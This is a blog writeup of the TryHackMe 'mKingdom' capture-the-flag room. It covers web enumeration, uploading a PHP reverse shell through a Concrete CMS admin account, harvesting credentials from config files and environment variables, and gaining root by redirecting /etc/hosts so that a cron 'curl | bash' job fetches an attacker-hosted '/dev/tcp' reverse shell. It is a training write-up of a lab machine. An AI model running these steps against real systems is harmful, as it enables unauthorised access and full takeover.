---
title: THM - mKingdom
description: My writeup for the TryHackMe mKingdom machine
date: 2024-06-17 00:00:00 +0000
categories: [CTF]
tags: [ctf, web]
---


A writeup for the TryHackMe room called `mKingdom`.
The IP for my machine was `10.10.10.55`, let's first add it to hosts file
```zsh
echo "10.10.10.55 kingdom.thm" | sudo tee -a /etc/hosts
```
# Enumeration
Starting with an `nmap` scan using default scripts (`-sC`), service detection (`-sV`), and scanning all ports (`-p-`). `-oA` means output all formats, this is just so I can refer back to it easily
```
nmap -sC -sV -oA kingdom_scan -p- kingdom.thm
```
This machine only has one open port, which is port 85/TCP
```
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN
```
# Investigating and Fuzzing the Site
Upon navigating to `http://kingdom.thm:85`, we are presented with 
![Root Site](/assets/img/thm-mkingdom/rootsite.png)
There was nothing interesting on this site, so let's kick off `gobuster` to try and find some hidden directories / endpoints
```zsh
gobuster dir -u http://kingdom.thm:85 -w /usr/share/wordlists/dirb/big.txt
...
/app      (Status: 301) [Size: 310] [--> http://kingdom.thm:85/app/]
...
```
## `/app` Endpoint
Navigating to the `/app` endpoint shows a page with a simple "jump" button. When clicked, the URL changes to `/app/castle`, where we are presented with another site. Upon checking the JS function code for the button, this is the only thing of note that happens (other than an alert message).
```js
function buttonClick() {
	alert("Make yourself confortable and enjoy my place.");
	window.location.href = 'castle';
}
```
## `/app/castle` Endpoint
We can see a webapp using the Concrete CMS version 8.5.2.
![Castle Site](/assets/img/thm-mkingdom/app_castle.png)
No notable exploits were found for this version of Concrete CMS.

I identified some file upload capabilities within the blog section of the site, where users can post replies to blog posts with supporting images. I tried bypassing the file extension filters to upload a PHP shell, but I didn't get anywhere.

Following some enumeration, I identified a login page at `http://kingdom.thm:85/app/castle/index.php/login/authenticate/concrete`.

### Locating Usernames and Passwords
From navigating the blog section of the `/app/castle` site, we are able to identify a user called `admin`, who is the author of the first, and only post on the blog. This gives us a username we can try to authenticate with. No passwords were located
### Bypassing the Login
I tried a number of things to bypass the login such as SQL injection, default credentials, brute force, but to no avail. The reason I gave up with brute force was because after about 5 login attempts, the machine IP blocks you and you are forced to restart the TryHackMe machine.

After hours of bashing my head against my desk, I learned that the password for the admin account is `password`. 
### Obtaining a Shell (`www-data`)
Typically, when you have admin access to a PHP-based CMS, you want to think about uploading a PHP shell to obtain shell access. With this in mind, I looked at the file upload settings, and added `.php` to the list of allowed extensions. 
![Allowed Files](/assets/img/thm-mkingdom/allowed_files.png)
After that, we can navigate to the `files` section of the CMS, and upload a PHP reverse shell. I used the one from `pentestmonkey` [Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
![File Upload](/assets/img/thm-mkingdom/upload_file.png)
Don't forget to start a shell listener
```zsh
nc -lvp 4444
```
After uploading the file, we are provided with a link to navigate to the file. When we click that we get a connection to our listener
![Upload Complete](/assets/img/thm-mkingdom/upload_complete.png)
```zsh
❯ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.11.47.141] from kingdom.thm [10.10.10.55] 49724
...
$ whoami
www-data
```
# Jump to User (`toad`)
First, stabilise the shell
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## Application Secrets
In typical www-data shell fashion, let's first look for any application secrets e.g. database credentials, environment variables, etc, which may help us move to the user account.

There are two `database.php` files:
```
/var/www/html/app/castle/application/config/database.php
/var/www/html/app/castle/concrete/config/database.php
```
Inspecting each of these reveal some SQL credentials for the `toad` account.
```php
// /var/www/html/app/castle/application/config/database.php
return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => '[REDACTED]',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```
Now, we can log into the `toad` account using the password:
```zsh
su toad
...
$ whoami
toad
```
# Lateral Movement (`mario` user)
Following a LOT of enumeration of the system, I inspected the environment variables of the `toad` user account and identified the following entry:
```
PWD_token=aW....g==
```
This is clearly base64 encoded (`==` at the end), and when decoded we get a password-looking string. This is the password for the `mario` account.

From here, we can get the user flag at `/home/mario/user.txt`
For some reason, I had issues running `cat` on the text file. I moved it to `/tmp` directory and I could read it fine.
# Privilege Escalation
There is an unusual `up.log` in the `/var/log` directory which has the following contents:
```
mario@mkingdom:/var/log$ cat up.log
There are 39807 folder and files in TheCastleApp in - - - - > Mon Jun 17 06:36:01 EDT 2024.
There are 39807 folder and files in TheCastleApp in - - - - > Mon Jun 17 06:37:01 EDT 2024.
There are 39807 folder and files in TheCastleApp in - - - - > Mon Jun 17 06:38:01 EDT 2024.
```
It seems to perform a check every minute. For a long time I was unsure how it was doing this. I noticed that the `/etc/hosts` file was writeable, which is unusual for CTF challenges. This prompted me to think that the file counter is done via some sort of web request.

Thanks to Tyler Ramsbey I learned of a tool called `pspy` which can monitor for file system changes / changes to the `/proc` directory. This helps you identify running processes.

I copied the `pspy` binary from the [GitHub](https://github.com/DominicBreuker/pspy/blob/master/README.md) to the target machine and ran it. (Note: you will have to clone to your machine and then across to the target, as the target has no internet access).

```
/tmp/pspy64
...
2024/06/17 06:45:01 CMD: UID=0     PID=2591   | /bin/sh -c rm /var/log/up.log
2024/06/17 06:45:01 CMD: UID=0     PID=2590   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
2024/06/17 06:45:01 CMD: UID=0     PID=2589   | CRON
2024/06/17 06:45:01 CMD: UID=0     PID=2588   | CRON
```
The system is making a curl request to `mkingdom.thm:85/app/castle/application/counter.sh`, and then executing it directly as bash. This seems to be part of cron - when I investigated cron jobs I didn't see anything, which suggests to me that this may be a cron job running as root.

Given that we can modify /etc/hosts, let's do it and point `mkingdom.thm` to our own IP address.

And now, on our machine, create the necessary file structure with a `counter.sh` script which is a reverse shell.
```zsh
mkdir app && cd app
mkdir castle && cd castle
mkdir application && cd application
echo "sh -i >& /dev/tcp/<THM_IP_ADDRESS>/4445 0>&1" > counter.sh
cd ../../../
```
Now start a HTTP server on port 85, and a listener on port 4445
```zsh
python3 -m http.server 85
# in separate terminal:
nc -lvp 4445
```
Now, wait a bit and the system should perform the curl request and pass it to bash, resulting in a reverse shell.
```zsh
Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
10.10.10.55 - - [17/Jun/2024 06:52:04] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
```
And our shell:
```
listening on [any] 4445 ...
connect to [10.11.47.141] from kingdom.thm [10.10.10.55] 57230
sh: 0: can't access tty; job control turned off
# whoami
root
```
# Final Thoughts
I didn't like this machine for a few reasons:
- I thought the initial access was silly for a CTF - why make the initial access brute force and then IP ban users after 5 attempts?
- Password in an environment variable? I found this boring
- Too many rabbit holes for my liking
I did, however, think the privilege escalation was pretty cool - I had never seen this before.
